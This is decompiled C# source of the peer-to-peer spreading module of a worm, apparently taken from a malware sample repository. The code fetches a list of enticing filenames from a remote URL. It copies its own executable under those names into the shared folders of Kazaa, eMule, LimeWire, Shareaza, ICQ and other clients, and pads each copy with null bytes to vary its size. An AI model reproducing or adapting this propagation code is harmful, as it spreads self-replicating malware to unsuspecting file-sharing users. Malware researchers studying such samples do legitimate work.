// Decompiled with JetBrains decompiler
// Type: explorer.P2P
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace explorer
{
  internal class P2P
  {
    private static string targetFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static string progpath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

    public static void Start()
    {
      if (!System.IO.File.Exists(P2P.targetFolder + "\\list.txt"))
      {
        new WebClient().DownloadFile(config.spreading_p2p_url, P2P.targetFolder + "\\list.txt");
        Thread.Sleep(2000);
      }
      P2P.BearshareStart();
      P2P.Edonkey2000Start();
      P2P.EmuleStart();
      P2P.GroksterStart();
      P2P.IcqStart();
      P2P.KazaaStart();
      P2P.LimewireStart();
      P2P.MorpheusStart();
      P2P.ShareazaStart();
      P2P.TeslaStart();
      P2P.WinmxStart();
      try
      {
        System.IO.File.Delete(P2P.targetFolder + "\\list.txt");
      }
      catch
      {
      }
    }

    public static void ShareazaStart()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Shareaza\\Shareaza\\Downloads", false);
      if (registryKey == null)
        return;
      P2P.Copyfromlist(registryKey.GetValue("CollectionPath").ToString() + "\\");
    }

    public static void EmuleStart()
    {
      string cPath1 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).Replace("Documents", "Downloads\\eMule\\Incoming\\");
      string cPath2 = P2P.progpath + "\\emule\\incoming\\";
      P2P.Copyfromlist(cPath1);
      P2P.Copyfromlist(cPath2);
    }

    public static void KazaaStart()
    {
      string cPath1 = P2P.progpath + "\\kazaa\\my shared folder\\";
      string cPath2 = P2P.progpath + "\\kazaa lite\\my shared folder\\";
      string cPath3 = P2P.progpath + "\\kazaa lite k++\\my shared folder\\";
      P2P.Copyfromlist(cPath1);
      P2P.Copyfromlist(cPath2);
      P2P.Copyfromlist(cPath3);
    }

    public static void IcqStart() => P2P.Copyfromlist(P2P.progpath + "\\icq\\shared folder\\");

    public static void GroksterStart() => P2P.Copyfromlist(P2P.progpath + "\\grokster\\my grokster\\");

    public static void BearshareStart() => P2P.Copyfromlist(P2P.progpath + "\\bearshare\\shared\\");

    public static void Edonkey2000Start() => P2P.Copyfromlist(P2P.progpath + "\\edonkey2000\\incoming\\");

    public static void MorpheusStart() => P2P.Copyfromlist(P2P.progpath + "\\morpheus\\my shared folder\\");

    public static void LimewireStart() => P2P.Copyfromlist(P2P.progpath + "\\limewire\\shared\\");

    public static void TeslaStart() => P2P.Copyfromlist(P2P.progpath + "\\tesla\\files\\");

    public static void WinmxStart() => P2P.Copyfromlist(P2P.progpath + "\\winmx\\shared\\");

    public static void Copyfromlist(string cPath)
    {
      if (!Directory.Exists(cPath))
        return;
      StreamReader streamReader = new StreamReader(P2P.targetFolder + "\\list.txt");
      for (string str = streamReader.ReadLine(); str != null; str = streamReader.ReadLine())
      {
        if (!System.IO.File.Exists(cPath + str + ".exe"))
        {
          try
          {
            System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, cPath + str + ".exe", true);
            FileStream fileStream = System.IO.File.OpenWrite(cPath + str + ".exe");
            long num1 = fileStream.Seek(0L, SeekOrigin.End);
            Decimal num2 = (Decimal) (Convert.ToInt32(str.Length) * 10485);
            while ((Decimal) num1 < num2)
            {
              ++num1;
              fileStream.WriteByte((byte) 0);
            }
            fileStream.Close();
          }
          catch
          {
          }
        }
      }
      streamReader.Close();
    }
  }
}
